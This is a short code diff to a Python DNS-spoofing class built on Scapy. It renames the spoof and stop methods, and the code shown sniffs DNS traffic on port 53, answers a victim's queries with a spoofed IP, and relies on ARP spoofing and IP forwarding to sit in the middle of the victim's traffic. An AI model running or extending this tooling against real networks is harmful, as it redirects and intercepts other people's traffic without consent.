@@ -97,7 +97,8 @@ class dns:
             # Unexpected, so drop
             pass
                  
-    def spoof(self, interface, domain, victim_ip, spoofed_ip):
+    def start(self, interface, domain, victim_ip, spoofed_ip):
+        self.stop_event.clear()
         print("Starting a DNS spoof for victim %s, pretending %s is at %s" % (victim_ip, domain, spoofed_ip))
         dns.set_ip_forwarding(True, interface)
         conf.route.resync()
@@ -108,12 +109,12 @@ class dns:
         while not self.stop_event.is_set():
             sniff(filter="udp and port 53", prn=lambda pkt: dns.handle_packet(pkt, domain, spoofed_ip, victim_ip, router_ip), store=0, iface=interface, timeout=1)
         print("stopping DNS spoof")
-        arp1.stop_spoof()
+        arp1.stop()
         arp_thread.join()
         dns.set_ip_forwarding(False, interface)
         print("DNS spoofing stopped")
     
-    def stop_spoof(self):
+    def stop(self):
         self.stop_event.set()
             
             
